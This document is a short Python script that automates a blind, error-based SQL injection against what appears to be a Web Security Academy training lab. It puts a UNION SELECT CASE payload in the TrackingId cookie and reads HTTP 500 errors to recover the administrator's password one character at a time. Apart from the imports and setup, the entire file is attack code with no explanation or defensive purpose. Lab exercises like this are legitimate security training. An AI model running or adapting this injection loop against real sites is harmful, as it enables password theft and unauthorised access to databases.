import requests
import string


base =string.ascii_lowercase+string.ascii_uppercase+string.digits

p=""



for i in range(1,10):
      for c in base:
            #

            session = requests.Session()
            paramsGet = {"category":"Pets"}
            headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0","Referer":"https://ac4a1f101ede3b5d8069192400cf0045.web-security-academy.net/","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
            cookies = {"TrackingId":"'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,{},1)='{}')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users -- -".format(i,str(c)),"session":"mm0zRN3u33GQ1nKXE67Wk7UFaI1s67oy"}
            response = session.get("https://ac4a1f101ede3b5d8069192400cf0045.web-security-academy.net/filter", params=paramsGet, headers=headers, cookies=cookies)
            if response.status_code==500:
                  p+=str(c)
                  print (p)


